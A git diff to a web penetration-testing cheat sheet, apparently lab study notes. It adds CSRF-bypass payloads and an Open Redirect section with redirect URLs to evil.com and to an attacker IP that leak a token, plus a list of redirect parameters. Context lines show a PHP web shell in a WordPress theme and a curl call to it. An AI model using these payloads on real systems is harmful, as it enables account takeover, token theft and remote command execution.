@@ -27,8 +27,9 @@ Overview
 23. - [Session Hijacking](#23---session-hijacking)
 24. - [Session Fixation](#24---session-fixation)
 25. - [Cross-Site Request Forgery](#25---cross-site-request-forgery-csrf)
-26. - [WordPress](#26---wordpress) 
-27. - [Exploit Research](#27---exploit-research)
+26. - [Open Redirect](#26---open-redirect) 
+27. - [WordPress](#27---wordpress) 
+28. - [Exploit Research](#28---exploit-research)
    
 #1. - Web Requests
 -----------------------------------------
@@ -1799,9 +1800,45 @@ Random CSRF Token e.g. CSRF-Token: 9cfffl3dj3837dfkj3j387fjcxmfjfd3
 Use Another Session’s CSRF Token e.g. CSRF-Token: 9cfffd9e8e78bd68975e295d1b3d3331
 Request Method Tampering e.g. Try GET and POST
 Delete the CSRF token parameter or send a blank token e.g. new_password=qwerty OR e.g. new_password=qwerty&csrf_token=
+Session Fixation > CSRF (same token as cookie and request parameter) e.g. POST /change_password Cookie: CSRF-Token=fixed_token; POST body:new_password=pwned&CSRF-Token=fixed_to
+Anti-CSRF Protection via the Referrer Header e.g. <meta name="referrer" content="no-referrer"
+Bypass the Regex e.g.  www.target.com.pwned.m3 OR www.pwned.m3?www.target.com OR www.pwned.m3/www.target.com
 ```
 
-#26. - WordPress
+#26. - Open Redirect
+-----------------------------------------
+
+- Open Redirect URL
+
+```
+http://trusted.site/index.php?url=https://evil.com
+http://oredirect.htb.net/?redirect_uri=http://<IP address>:<port>&token=<RANDOM TOKEN ASSIGNED BY THE APP>
+```
+
+- Open Redirect URL Parameters
+
+```
+?url=
+?link=
+?redirect=
+?redirecturl=
+?redirect_uri=
+?return=
+?return_to=
+?returnurl=
+?go=
+?goto=
+?exit=
+?exitpage=
+?fromurl=
+?fromuri=
+?redirect_to=
+?next=
+?newurl=
+?redir=
+```
+
+#27. - WordPress
 -----------------------------------------
 
 - Version Enumeration
@@ -1863,7 +1900,7 @@ system($_GET['cmd']);
 $ curl -X GET "http://<URL>/wp-content/themes/twentyseventeen/404.php?cmd=id"
 ```
 
-#27. - Exploit Research
+#28. - Exploit Research
 -----------------------------------------
 
 - CVEdetails
